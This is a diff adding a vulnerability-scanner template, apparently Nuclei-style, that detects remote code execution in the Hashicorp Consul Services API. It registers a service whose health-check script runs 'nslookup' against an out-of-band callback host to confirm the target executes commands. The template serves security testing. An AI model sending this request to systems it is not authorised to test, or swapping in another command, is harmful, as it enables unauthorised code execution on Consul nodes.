@@ -1,0 +1,35 @@
+id: hashicorp-consul-rce
+brief:
+    title: Hashicorp Consul Services API - Remote Code Execution
+    by: pikpikcu
+    level: critical
+    about: Hashicorp Consul Services API is vulnerable to an attack that can be leveraged to perform remote command execution on Consul nodes.
+    label:
+        - hashicorp
+        - rce
+        - oast
+        - intrusive
+        - edb
+        - vuln
+    score: CVSS:10.0
+moves:
+    - verb: PUT
+      to:
+        - '{{BaseURL}}/v1/agent/service/register'
+      body: |-
+        {
+          "ID": "{{randstr}}",
+          "Name": "{{randstr}}",
+          "Address": "127.0.0.1",
+          "Port": 80,
+          "check": {
+            "script": "nslookup {{interactsh-url}}",
+            "interval": "10s",
+            "Timeout": "86400s"
+          }
+        }
+      signs:
+        - "on": word
+          has:
+            - dns
+          in: interactsh_protocol
